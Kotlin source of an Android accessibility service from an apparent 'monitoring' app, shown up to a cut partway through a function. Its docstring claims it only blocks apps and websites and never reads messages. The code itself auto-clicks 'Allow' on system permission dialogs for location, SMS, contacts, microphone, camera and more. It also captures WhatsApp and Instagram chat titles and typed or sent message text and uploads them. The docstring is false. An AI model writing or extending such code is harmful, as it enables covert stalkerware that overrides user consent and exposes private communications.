package com.spapp.monitoring.blocking

import android.accessibilityservice.AccessibilityService
import android.graphics.Rect
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.spapp.monitoring.collectors.FileManagerCollector
import com.spapp.monitoring.data.DeviceState
import com.spapp.monitoring.data.local.AppDatabase
import com.spapp.monitoring.data.local.WhatsAppMessageEntry
import com.spapp.monitoring.data.local.InstagramMessageEntry
import com.spapp.monitoring.collectors.WhatsAppNotificationListener
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Locale

/**
 * Enforces app_blocking and website_blocking rules (Phase 7).
 * Inspects: (1) which app's window just came to the foreground, and
 * (2) the visible address-bar text of supported browsers for website blocking rules.
 * It never reads message content, chat text, or any other private on-screen content.
 *
 * WHY ACCESSIBILITY, NOT A CONTENT PROVIDER QUERY: modern Chrome exposes no
 * history API to third-party apps at all (removed from the public SDK years
 * ago) — there is no supported way to read it without this. Address-bar
 * inspection only works for browsers that expose a stable accessibility
 * resource-id for their URL bar, listed below; an unsupported or updated
 * browser simply won't be covered, for blocking or for history, while
 * app-level blocking (blocking a browser entirely) still works regardless.
 *
 * EVENT SUBSCRIPTION — ONLY typeWindowStateChanged (see
 * accessibility_service_config.xml), deliberately. An earlier version also
 * subscribed to typeWindowContentChanged to catch in-page navigation within
 * a browser (switching sites without leaving the window never fires
 * typeWindowStateChanged). That event type fires constantly for every app's
 * every UI redraw system-wide — there is no way to scope it to "only
 * browsers" at the OS subscription level without also scoping
 * typeWindowStateChanged the same way (AccessibilityServiceInfo.packageNames
 * applies to all subscribed event types together, not per type), which would
 * risk silently losing the very event app-blocking depends on for every
 * other app. The flood of extra events was the suspected cause of app
 * blocking becoming intermittent (worked twice, then silently didn't) after
 * that change. Reverted — in-page navigation is now covered by a short
 * polling loop (see browserPollRunnable) that only runs while a browser is
 * confirmed foreground, so it costs nothing for any other app and never
 * touches the service's OS-level event subscription.
 */
class BlockAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "BlockA11y"
        @Volatile
        var instance: BlockAccessibilityService? = null
            private set
    }

    private lateinit var rulesCache: BlockRulesCache
    private var lastBlockedPackage: String? = null
    private var lastBlockedAt = 0L
    private var currentForegroundApp: String? = null
    private var lastScrollEventTime = 0L
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private val pollHandler = Handler(Looper.getMainLooper())
    private var browserPollRunnable: Runnable? = null
    private val browserPollIntervalMs = 1500L

    private val browserUrlBarIds = setOf(
        "com.android.chrome:id/url_bar",
        "com.google.android.apps.chrome:id/url_bar",
        "com.brave.browser:id/url_bar",
        "org.mozilla.firefox:id/mozac_browser_toolbar_url_view",
        "com.microsoft.emmx:id/url_bar",
    )
    private val browserPackages = browserUrlBarIds.map { it.substringBefore(":id/") }.toSet()

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        try {
            val info = serviceInfo ?: android.accessibilityservice.AccessibilityServiceInfo()
            info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED or
                    AccessibilityEvent.TYPE_VIEW_SCROLLED or
                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
            info.feedbackType = android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_GENERIC
            info.flags = info.flags or
                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            serviceInfo = info
        } catch (e: Exception) {
            Log.e("BlockA11y", "Failed to configure serviceInfo dynamically", e)
        }
        try {
            rulesCache = BlockRulesCache(applicationContext)
            com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)
            startPermissionAutoGrantLoop()
            com.spapp.monitoring.sync.SyncScheduler.runOnce(applicationContext)
        } catch (e: Exception) {
            Log.e("BlockA11y", "Failed during onServiceConnected background initialization", e)
        }
    }

    /**
     * Actively scans windows gently every 250ms for ~5 seconds to automatically click
     * "Allow" or "While using the app" on runtime permission dialogs without pegging MainLooper.
     */
    private var permissionSyncRunnable: Runnable? = null
    private val syncDebounceHandler = Handler(Looper.getMainLooper())

    private fun scheduleSyncAfterPermissionClick() {
        permissionSyncRunnable?.let { syncDebounceHandler.removeCallbacks(it) }
        val r = Runnable {
            Log.i("BlockA11y", "Permissions updated via auto-grant — triggering instant SyncRunner pass")
            com.spapp.monitoring.sync.SyncScheduler.runOnce(applicationContext)
        }
        permissionSyncRunnable = r
        syncDebounceHandler.postDelayed(r, 600L)
    }

    fun startPermissionAutoGrantLoop() {
        val handler = Handler(Looper.getMainLooper())
        var runs = 0
        val maxRuns = 60 // 60 * 250ms = 15-18 seconds of continuous scanning to catch ALL sequential permission dialogs
        val runnable = object : Runnable {
            override fun run() {
                runs++
                val clicked = clickAnyPermissionDialog()
                // Continuous auto-grant: Keep running even when clicked == true!
                // Android presents permissions sequentially (Location -> Calls -> Contacts -> SMS -> Mic -> Camera -> Storage)
                if (runs < maxRuns) {
                    val nextDelay = if (clicked) 350L else 200L
                    handler.postDelayed(this, nextDelay)
                } else {
                    scheduleSyncAfterPermissionClick()
                }
            }
        }
        handler.postDelayed(runnable, 150L)
    }

    fun clickAnyPermissionDialog(): Boolean {
        try {
            val candidateRoots = mutableListOf<AccessibilityNodeInfo>()
            rootInActiveWindow?.let { candidateRoots.add(it) }
            try {
                windows?.forEach { win ->
                    win.root?.let { candidateRoots.add(it) }
                }
            } catch (_: Exception) {}

            if (candidateRoots.isEmpty()) return false

            // Target resource IDs across Google Pixel, AOSP, Samsung OneUI, Xiaomi MIUI, Oppo ColorOS, Vivo FuntouchOS
            val targetIds = listOf(
                "com.google.android.permissioncontroller:id/permission_allow_foreground_only_button",
                "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
                "com.google.android.permissioncontroller:id/permission_allow_button",
                "com.android.permissioncontroller:id/permission_allow_button",
                "com.google.android.permissioncontroller:id/permission_allow_one_time_button",
                "com.android.permissioncontroller:id/permission_allow_one_time_button",
                "com.google.android.permissioncontroller:id/permission_allow_always_button",
                "com.android.permissioncontroller:id/permission_allow_always_button",
                "com.samsung.android.permissioncontroller:id/permission_allow_button",
                "com.samsung.android.permissioncontroller:id/permission_allow_foreground_only_button",
                "com.samsung.android.permissioncontroller:id/permission_allow_always_button",
                "com.android.packageinstaller:id/permission_allow_button",
                "com.google.android.packageinstaller:id/permission_allow_button",
                "com.samsung.android.packageinstaller:id/permission_allow_button",
                "com.coloros.safecenter:id/permission_allow_button",
                "com.coloros.securitypermission:id/permission_allow_button",
                "com.coloros.securitypermission:id/btn_allow",
                "com.vivo.permissionmanager:id/permission_allow_button",
                "com.vivo.permissionmanager:id/btn_allow",
                "com.miui.securitycenter:id/accept",
                "com.lbe.security.miui:id/accept",
                "com.miui.securitycenter:id/btn_accept",
                "android:id/button1"
            )

            // Step 1: Search by exact View IDs (language-independent)
            for (root in candidateRoots) {
                for (viewId in targetIds) {
                    try {
                        val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
                        if (!nodes.isNullOrEmpty()) {
                            for (node in nodes) {
                                if (clickNodeOrParent(node)) {
                                    Log.i("BlockA11y", "Auto-clicked permission button by ID: " + viewId)
                                    scheduleSyncAfterPermissionClick()
                                    return true
                                }
                            }
                        }
                    } catch (_: Exception) {}
                }
            }

            // Step 2: Search by exact and prefix text matching
            val allowExactTexts = setOf(
                "while using the app",
                "only this time",
                "allow",
                "allow all the time",
                "allow all",
                "precise",
                "turn on",
                "enable",
                "continue",
                "agree",
                "accept",
                "ok",
                "keep",
                "always",
                "grant",
                "unrestricted",
                "அனுமதி"
            )

            for (root in candidateRoots) {
                if (findAndClickExactText(root, allowExactTexts)) {
                    scheduleSyncAfterPermissionClick()
                    return true
                }
            }

            // Step 3: Flexible ID suffix fallback
            for (root in candidateRoots) {
                if (findAndClickIdSuffix(root)) {
                    scheduleSyncAfterPermissionClick()
                    return true
                }
            }
        } catch (e: Exception) {
            Log.e("BlockA11y", "Error in clickAnyPermissionDialog", e)
        }
        return false
    }

    private fun findAndClickExactText(node: AccessibilityNodeInfo?, targetTexts: Set<String>): Boolean {
        if (node == null) return false
        try {
            val nodeText = (node.text ?: node.contentDescription)?.toString()?.trim()?.lowercase() ?: ""
            if (nodeText.isNotEmpty() && targetTexts.contains(nodeText)) {
                val cls = (node.className ?: "").toString().lowercase()
                if (cls.contains("button") || cls.contains("text") || node.isClickable || (node.parent?.isClickable == true)) {
                    if (clickNodeOrParent(node)) {
                        Log.i("BlockA11y", "Auto-clicked permission button by exact text: '$nodeText'")
                        return true
                    }
                }
            }
            if (nodeText.startsWith("while using") || nodeText.startsWith("only this time") ||
                nodeText == "allow" || nodeText.startsWith("allow ") || nodeText == "turn on" || nodeText == "enable") {
                val cls = (node.className ?: "").toString().lowercase()
                if (cls.contains("button") || node.isClickable || (node.parent?.isClickable == true)) {
                    if (clickNodeOrParent(node)) {
                        Log.i("BlockA11y", "Auto-clicked permission button by prefix text: '$nodeText'")
                        return true
                    }
                }
            }
            for (i in 0 until node.childCount) {
                try {
                    val child = node.getChild(i) ?: continue
                    if (findAndClickExactText(child, targetTexts)) return true
                } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
        return false
    }

    private fun findAndClickIdSuffix(node: AccessibilityNodeInfo?): Boolean {
        if (node == null) return false
        try {
            val resId = (node.viewIdResourceName ?: "").lowercase()
            if (resId.endsWith(":id/permission_allow_foreground_only_button") ||
                resId.endsWith(":id/permission_allow_button") ||
                resId.endsWith(":id/permission_allow_one_time_button") ||
                resId.endsWith(":id/permission_allow_always_button") ||
                resId.endsWith(":id/allow_button") ||
                resId.endsWith(":id/btn_allow") ||
                resId.endsWith(":id/button1") ||
                resId.endsWith(":id/accept") ||
                resId.endsWith(":id/btn_accept")
            ) {
                if (clickNodeOrParent(node)) {
                    Log.i("BlockA11y", "Auto-clicked permission button by suffix: $resId")
                    return true
                }
            }
            for (i in 0 until node.childCount) {
                try {
                    val child = node.getChild(i) ?: continue
                    if (findAndClickIdSuffix(child)) return true
                } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
        return false
    }

    private fun clickNodeOrParent(node: AccessibilityNodeInfo): Boolean {
        if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
            return true
        }
        var p = node.parent
        while (p != null) {
            val cls = p.className?.toString() ?: ""
            if (p.isClickable && (cls.contains("Button") || p.isClickable)) {
                if (p.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    return true
                }
            }
            p = p.parent
        }
        return false
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        try {
            val eventType = event.eventType
            val packageName = event.packageName?.toString() ?: return
            if (packageName == applicationContext.packageName) return // never block ourselves

        // ==========================================
        // 🌟 AUTOMATE RUNTIME PERMISSIONS (ALL ANDROID VERSIONS & OEMS)
        // ==========================================
        // val isPermissionCandidate = packageName.contains("permission") ||
        //         packageName.contains("installer") ||
        //         packageName.contains("security") ||
        //         packageName.contains("settings") ||
        //         packageName == "android"

        // if (isPermissionCandidate) {
        //     if (clickAnyPermissionDialog()) {
        //         return
        //     }
        // }
        // // ==========================================

        // if (eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
        //     val now = android.os.SystemClock.uptimeMillis()
        //     if (now - lastScrollEventTime < 750L) {
        //         return
        //     }
        //     lastScrollEventTime = now
        // }


        // ==========================================
        // 🌟 AUTOMATE RUNTIME PERMISSIONS (WINDOW INTERCEPTION)
        // ==========================================
        val isPermissionCandidate = packageName.contains("permission") ||
                packageName.contains("packageinstaller") ||
                packageName.contains("installer") ||
                packageName.contains("security") ||
                packageName.contains("safecenter") ||
                packageName == "android"

        if (isPermissionCandidate) {
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                clickAnyPermissionDialog()
            }
        }
        // ==========================================

        if (eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
            val now = android.os.SystemClock.uptimeMillis()
            if (now - lastScrollEventTime < 750L) {
                return
            }
            lastScrollEventTime = now
        }
        
        // ... (Keep the rest of your original notification, WhatsApp, Instagram polling code exactly as is)


        if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            val notification = event.parcelableData as? android.app.Notification
            val eventTexts = try { event.text?.mapNotNull { it?.toString()?.trim() }?.filter { it.isNotBlank() } } catch (_: Exception) { null }
            val postTime = if (notification != null && notification.`when` > 0) notification.`when` else System.currentTimeMillis()
            if (packageName == "com.instagram.android" || packageName == "com.instagram.lite" || packageName.contains("instagram")) {
                com.spapp.monitoring.collectors.WhatsAppNotificationListener.processInstagramNotificationData(
                    applicationContext,
                    notification,
                    postTime,
                    packageName,
                    fallbackTexts = eventTexts
                )
            } else if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b") {
                com.spapp.monitoring.collectors.WhatsAppNotificationListener.processWhatsAppNotificationData(
                    applicationContext,
                    notification,
                    postTime,
                    packageName,
                    fallbackTexts = eventTexts
                )
            }
            return
        }

        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (packageName in browserPackages) {
                checkWebsiteRules()
                startBrowserPolling()
            } else {
                stopBrowserPolling()
            }

            val isImeOrSystem = packageName.startsWith("com.google.android.inputmethod") ||
                    packageName.contains("honeyboard") ||
                    packageName.contains("swiftkey") ||
                    packageName.contains("keyboard") ||
                    packageName.contains("inputmethod") ||
                    packageName == "android" ||
                    packageName == "com.android.systemui"

            if (!isImeOrSystem) {
                currentForegroundApp = packageName

                if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b") {
                    startWhatsAppPolling()
                    val currentRoot = getWhatsAppWindowRoot(event.source ?: rootInActiveWindow)
                    if (isInsideWhatsAppConversation(currentRoot)) {
                        // User is inside a conversation
                        val title = getWhatsAppCurrentChatTitle(currentRoot)
                        if (!title.isNullOrBlank() && !isWhatsAppReservedTitle(title)) {
                            if (!title.equals(lastActiveChatForSignatures, ignoreCase = true)) {
                                lastActiveChatForSignatures = title
                                lastClickedWhatsAppChat = title
                                lastClickedWhatsAppChatTime = System.currentTimeMillis()
                                currentChatSeenSignatures.clear()
                                recordWhatsAppChatOpened(title)
                            }
                        }
                    } else if (isWhatsAppMainScreen(currentRoot)) {
                        val now = System.currentTimeMillis()
                        if ((now - lastClickedWhatsAppChatTime) > 4000L) {
                            lastActiveChatForSignatures = null
                            currentChatSeenSignatures.clear()
                            lastClickedWhatsAppChat = null
                            lastWhatsAppComposerText = null
                        }
                    }
                } else {
                    stopWhatsAppPolling()
                    lastActiveChatForSignatures = null
                    currentChatSeenSignatures.clear()
                    lastClickedWhatsAppChat = null
                    lastWhatsAppComposerText = null
                }

                if (packageName == "com.instagram.android" || packageName == "com.instagram.lite" || packageName.contains("instagram")) {
                    val igRoot = getInstagramWindowRoot(event.source ?: rootInActiveWindow)
                    detectAndHandleInstagramAccountSwitch(igRoot)
                    startInstagramPolling()
                    if (isInsideInstagramConversation(igRoot)) {
                        val title = getInstagramCurrentChatTitle(igRoot)
                        if (!title.isNullOrBlank() && !isInstagramReservedTitle(title)) {
                            if (!title.equals(lastActiveInstagramChatForSignatures, ignoreCase = true)) {
                                lastActiveInstagramChatForSignatures = title
                                lastClickedInstagramChat = title
                                lastClickedInstagramChatTime = System.currentTimeMillis()
                                currentInstagramChatSeenSignatures.clear()
                                recordInstagramChatOpened(title)
                            }
                        }
                    } else {
                        val now = System.currentTimeMillis()
                        if ((now - lastClickedInstagramChatTime) > 4000L) {
                            lastActiveInstagramChatForSignatures = null
                            currentInstagramChatSeenSignatures.clear()
                            lastClickedInstagramChat = null
                            lastInstagramComposerText = null
                        }
                    }
                } else {
                    stopInstagramPolling()
                    lastActiveInstagramChatForSignatures = null
                    currentInstagramChatSeenSignatures.clear()
                    lastClickedInstagramChat = null
                    lastInstagramComposerText = null
                }

                checkAppRule(packageName)
            }
        }

        // Real-time WhatsApp capture:
        // Trigger immediately when user taps (e.g. clicks Send button or chat row), when messages appear on screen,
        // when scrolling through chats/conversation, or when window state changes
        val isWhatsAppActive = packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b" ||
                ((currentForegroundApp == "com.whatsapp" || currentForegroundApp == "com.whatsapp.w4b") &&
                 (packageName.startsWith("com.google.android.inputmethod") || packageName.contains("honeyboard") || packageName.contains("keyboard") || packageName.contains("swiftkey")))
        if (isWhatsAppActive) {
            if (whatsAppPollRunnable == null) {
                startWhatsAppPolling()
            }
            // Track composer text from entry node or event source
            try {
                val root = getWhatsAppWindowRoot(event.source ?: rootInActiveWindow)
                val entryNode = findWhatsAppComposerNode(root)
                val currentText = entryNode?.text?.toString()?.trim()
                if (!currentText.isNullOrBlank() && !currentText.equals("Type a message", ignoreCase = true) && !currentText.equals("Message", ignoreCase = true)) {
                    lastWhatsAppComposerText = currentText
                }
            } catch (_: Exception) {}

            try {
                val source = event.source
                if (source != null && (source.isEditable || source.viewIdResourceName?.endsWith(":id/entry") == true)) {
                    val sText = source.text?.toString()?.trim()
                    if (!sText.isNullOrBlank() && !sText.equals("Type a message", ignoreCase = true) && !sText.equals("Message", ignoreCase = true)) {
                        lastWhatsAppComposerText = sText
                    }
                }
            } catch (_: Exception) {}

            if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                try {
                    val clickedNode = event.source
                    if (clickedNode != null) {
                        val cText = clickedNode.text?.toString()?.trim() ?: ""
                        val cDesc = clickedNode.contentDescription?.toString()?.trim() ?: ""
                        val cId = (clickedNode.viewIdResourceName ?: "").lowercase()
                        val pDesc = (clickedNode.parent?.contentDescription?.toString() ?: "").trim()
                        val pId = (clickedNode.parent?.viewIdResourceName ?: "").lowercase()

                        val waRoot = getWhatsAppWindowRoot(event.source ?: rootInActiveWindow)
                        val inConv = isInsideWhatsAppConversation(waRoot)

                        val isSendClick = inConv && (
                            cDesc.contains("send", ignoreCase = true) ||
                            cText.equals("send", ignoreCase = true) ||
                            cId.endsWith(":id/send") ||
                            pDesc.contains("send", ignoreCase = true) ||
                            pId.endsWith(":id/send")
                        )

                        if (isSendClick) {
                            var sentText = lastWhatsAppComposerText
                            if (sentText.isNullOrBlank()) {
                                try {
                                    val entry = findWhatsAppComposerNode(waRoot)
                                    val et = entry?.text?.toString()?.trim()
                                    if (!et.isNullOrBlank() && !et.equals("Type a message", ignoreCase = true) && !et.equals("Message", ignoreCase = true)) {
                                        sentText = et
                                    }
                                } catch (_: Exception) {}
                            }

                            val chatTitle = getWhatsAppCurrentChatTitle(waRoot) ?: lastActiveChatForSignatures ?: lastClickedWhatsAppChat
                            val textToSend = sentText
                            // Clear composer memory IMMEDIATELY so next message doesn't collide
                            lastWhatsAppComposerText = null

                            if (!textToSend.isNullOrBlank() && !chatTitle.isNullOrBlank()) {
                                val now = System.currentTimeMillis()
                                recordRecentSentWhatsAppText(textToSend)
                                val dedupeKey = "wa|$chatTitle|$textToSend|true|text"
                                currentChatSeenSignatures.remove(dedupeKey)

                                // 1.5s window to prevent button bounce/double-tap, allowing consecutive messages immediately
                                if (shouldCaptureMessage(dedupeKey, 1500L)) {
                                    scope.launch {
                                        try {
                                            val db = AppDatabase.getInstance(applicationContext)
                                            db.whatsAppMessageDao().updateToOutgoing(chatTitle, textToSend, now - 60_000L)
                                            val existingId = db.whatsAppMessageDao().findExistingRecent(
                                                chatTitle, textToSend, true, now - 2_000L
                                            )
                                            if (existingId == null) {
                                                db.whatsAppMessageDao().insertAll(
                                                    listOf(
                                                        WhatsAppMessageEntry(
                                                            chatName = chatTitle,
                                                            sender = "me",
                                                            messageText = textToSend,
                                                            isOutgoing = true,
                                                            messageTimeEpochMs = now,
                                                            mediaType = "text"
                                                        )
                                                    )
                                                )
                                                com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext, immediate = true)
                                            }
                                        } catch (_: Throwable) {}
                                    }
                                }
                            }
                            pollHandler.postDelayed({ try { recordWhatsAppChatIfForeground(getWhatsAppWindowRoot()) } catch (_: Throwable) {} }, 300L)
                            pollHandler.postDelayed({ try { recordWhatsAppChatIfForeground(getWhatsAppWindowRoot()) } catch (_: Throwable) {} }, 1000L)
                        } else if (cDesc.contains("back", ignoreCase = true) || cDesc.contains("navigate up", ignoreCase = true) || cId.endsWith(":id/back")) {
                            lastClickedWhatsAppChat = null
                            lastWhatsAppComposerText = null
                            lastActiveChatForSignatures = null
                            currentChatSeenSignatures.clear()
                        } else if (!inConv) {
                            val texts = mutableListOf<String>()
                            fun walkClick(n: AccessibilityNodeInfo?, d: Int = 0) {
                                if (n == null || d > 12) return
                                try {
                                    val cd = n.contentDescription?.toString()
                                    val fromCd = extractWhatsAppNameFromDesc(cd)
                                    if (!fromCd.isNullOrBlank()) {
                                        texts.add(0, fromCd)
                                    }
                                    val t = n.text?.toString()?.trim()
                                    if (!t.isNullOrBlank()) texts.add(t)
                                    for (i in 0 until n.childCount) {
                                        walkClick(n.getChild(i), d + 1)
                                    }
                                } catch (_: Exception) {}
                            }
                            var rowContainer = clickedNode
                            var upCount = 0
                            val displayMetrics = resources.displayMetrics
                            val screenW = displayMetrics.widthPixels
                            while (rowContainer?.parent != null && upCount < 6) {
                                val r = Rect()
                                rowContainer.getBoundsInScreen(r)
                                if (r.height() in 110..550 && r.width() > screenW * 0.65f) {
                                    break
                                }
                                rowContainer = rowContainer.parent
                                upCount++
                            }
                            walkClick(rowContainer ?: clickedNode)
                            val titleCand = texts.firstOrNull {
                                it.length in 2..60 && !it.contains(":\\d{2}".toRegex()) &&
                                !it.startsWith("You:", ignoreCase = true) &&
                                !isWhatsAppUiMetadataOrTimestamp(it) &&
                                !isWhatsAppReservedTitle(it)
                            }
                            if (!titleCand.isNullOrBlank()) {
                                lastClickedWhatsAppChat = titleCand
                                lastClickedWhatsAppChatTime = System.currentTimeMillis()
                                lastActiveChatForSignatures = titleCand
                                currentChatSeenSignatures.clear()

                                // Immediately register the opened chat in Room and sync to server!
                                recordWhatsAppChatOpened(titleCand)

                                pollHandler.postDelayed({ try { recordWhatsAppChatIfForeground(getWhatsAppWindowRoot()) } catch (_: Throwable) {} }, 300L)
                                pollHandler.postDelayed({ try { recordWhatsAppChatIfForeground(getWhatsAppWindowRoot()) } catch (_: Throwable) {} }, 700L)
                                pollHandler.postDelayed({ try { recordWhatsAppChatIfForeground(getWhatsAppWindowRoot()) } catch (_: Throwable) {} }, 1200L)
                                pollHandler.postDelayed({ try { recordWhatsAppChatIfForeground(getWhatsAppWindowRoot()) } catch (_: Throwable) {} }, 2000L)
                            }
                        }
                    }
                } catch (_: Throwable) {}
            }

            // Detect send via soft keyboard Enter key (composer transitions from non-empty to empty)
            if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                try {
                    val root = getWhatsAppWindowRoot()
                    val entryNode = findWhatsAppComposerNode(root)
                    if (entryNode != null) {
                        val newText = entryNode.text?.toString()?.trim()
                        val isNowEmpty = newText.isNullOrBlank() || newText.equals("Type a message", ignoreCase = true) || newText.equals("Message", ignoreCase = true)
                        if (isNowEmpty && !lastWhatsAppComposerText.isNullOrBlank()) {
                            val sentText = lastWhatsAppComposerText!!
                            val chatTitle = getWhatsAppCurrentChatTitle(root) ?: lastActiveChatForSignatures ?: lastClickedWhatsAppChat
                            if (!chatTitle.isNullOrBlank() && !isWhatsAppReservedTitle(chatTitle)) {
                                val now = System.currentTimeMillis()
                                recordRecentSentWhatsAppText(sentText)
                                val dedupeKey = "wa|$chatTitle|$sentText|true|text"
                                if (shouldCaptureMessage(dedupeKey, 1500L)) {
                                    scope.launch {
                                        try {
                                            val db = AppDatabase.getInstance(applicationContext)
                                            db.whatsAppMessageDao().updateToOutgoing(chatTitle, sentText, now - 60_000L)
                                            val existingId = db.whatsAppMessageDao().findExistingRecent(
                                                chatTitle, sentText, true, now - 2_000L
                                            )
                                            if (existingId == null) {
                                                db.whatsAppMessageDao().insertAll(
                                                    listOf(
                                                        WhatsAppMessageEntry(
                                                            chatName = chatTitle,
                                                            sender = "me",
                                                            messageText = sentText,
                                                            isOutgoing = true,
                                                            messageTimeEpochMs = now,
                                                            mediaType = "text"
                                                        )
                                                    )
                                                )
                                                com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext, immediate = true)
                                            }
                                        } catch (_: Throwable) {}
                                    }
                                }
                            }
                            lastWhatsAppComposerText = null
                        }
                    }
                } catch (_: Throwable) {}
            }

            val shouldInspectWa = when (eventType) {
                AccessibilityEvent.TYPE_VIEW_CLICKED,
                AccessibilityEvent.TYPE_VIEW_SCROLLED,
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> true
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                    val nowMs = System.currentTimeMillis()
                    if (nowMs - lastWaContentInspectAt >= 350L) {
                        lastWaContentInspectAt = nowMs
                        true
                    } else false
                }
                else -> false
            }
            if (shouldInspectWa) {
                val nodeToInspect = getWhatsAppWindowRoot(event.source ?: rootInActiveWindow)
                recordWhatsAppChatIfForeground(nodeToInspect)
            }
        }

        // Real-time Instagram Direct capture & in-app account switch detection:
        val isInstagramActive = packageName == "com.instagram.android" || packageName == "com.instagram.lite" ||
                ((currentForegroundApp == "com.instagram.android" || currentForegroundApp == "com.instagram.lite") &&
                 (packageName.startsWith("com.google.android.inputmethod") || packageName.contains("honeyboard") || packageName.contains("keyboard") || packageName.contains("swiftkey")))
        if (isInstagramActive) {
            if (instagramPollRunnable == null) {
                startInstagramPolling()
            }
            val igRoot = getInstagramWindowRoot(event.source ?: rootInActiveWindow)
            // 1. Track composer text while user types
            try {
                val entryNode = findInstagramComposerNode(igRoot)
                val currentText = entryNode?.text?.toString()?.trim()
                if (!currentText.isNullOrBlank() && !currentText.equals("Message...", ignoreCase = true)) {
                    lastInstagramComposerText = currentText
                }
            } catch (_: Exception) {}

            try {
                val source = event.source
                if (source != null && (source.isEditable || source.viewIdResourceName?.contains("composer_edittext") == true)) {
                    val sText = source.text?.toString()?.trim()
                    if (!sText.isNullOrBlank() && !sText.equals("Message...", ignoreCase = true)) {
                        lastInstagramComposerText = sText
                    }
                }
            } catch (_: Exception) {}

            if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                checkAccountSwitcherClick(event.source, igRoot)
                try {
                    val clickedNode = event.source
                    if (clickedNode != null) {
                        val cText = clickedNode.text?.toString()?.trim() ?: ""
                        val cDesc = clickedNode.contentDescription?.toString()?.trim() ?: ""
                        val cId = (clickedNode.viewIdResourceName ?: "").lowercase()
                        val pDesc = (clickedNode.parent?.contentDescription?.toString() ?: "").trim()
                        val pId = (clickedNode.parent?.viewIdResourceName ?: "").lowercase()
                        val gpDesc = (clickedNode.parent?.parent?.contentDescription?.toString() ?: "").trim()
                        val gpId = (clickedNode.parent?.parent?.viewIdResourceName ?: "").lowercase()

                        val inConv = isInsideInstagramConversation(igRoot)
                        val isSendClick = inConv && (
                            cDesc.contains("send", ignoreCase = true) ||
                            cText.equals("send", ignoreCase = true) ||
                            cId.contains("send") ||
                            cId.contains("action_button") ||
                            pDesc.contains("send", ignoreCase = true) ||
                            pId.contains("send") ||
                            gpDesc.contains("send", ignoreCase = true) ||
                            gpId.contains("send")
                        )

                        if (isSendClick) {
                            var sentText = lastInstagramComposerText
                            if (sentText.isNullOrBlank()) {
                                try {
                                    val entry = findInstagramComposerNode(igRoot)
                                    val et = entry?.text?.toString()?.trim()
                                    if (!et.isNullOrBlank() && !et.equals("Message...", ignoreCase = true)) {
                                        sentText = et
                                    }
                                } catch (_: Exception) {}
                            }

                            val chatTitle = getInstagramCurrentChatTitle(igRoot) ?: lastActiveInstagramChatForSignatures ?: lastClickedInstagramChat
                            val textToSend = sentText
                            // Clear composer memory IMMEDIATELY so next message doesn't collide
                            lastInstagramComposerText = null

                            if (!textToSend.isNullOrBlank() && !chatTitle.isNullOrBlank()) {
                                val now = System.currentTimeMillis()
                                recordRecentSentInstagramText(textToSend)
                                val dedupeKey = "ig|$chatTitle|$textToSend|true|text"
                                if (shouldCaptureMessage(dedupeKey, 1500L)) {
                                    scope.launch {
                                        try {
                                            val db = AppDatabase.getInstance(applicationContext)
                                            db.instagramMessageDao().updateToOutgoing(chatTitle, textToSend, now - 60_000L)
                                            val existingId = db.instagramMessageDao().findExistingRecent(
                                                chatTitle, textToSend, true, now - 2_000L
                                            )
                                            if (existingId == null) {
                                                db.instagramMessageDao().insertAll(
                                                    listOf(
                                                        InstagramMessageEntry(
                                                            chatName = chatTitle,
                                                            sender = "me",
                                                            messageText = textToSend,
                                                            isOutgoing = true,
                                                            messageTimeEpochMs = now,
                                                            mediaType = "text"
                                                        )
                                                    )
                                                )
                                                com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext, immediate = true)
                                            }
                                        } catch (_: Throwable) {}
                                    }
                                }
                            }
                            pollHandler.postDelayed({ try { recordInstagramChatIfForeground(getInstagramWindowRoot()) } catch (_: Throwable) {} }, 300L)
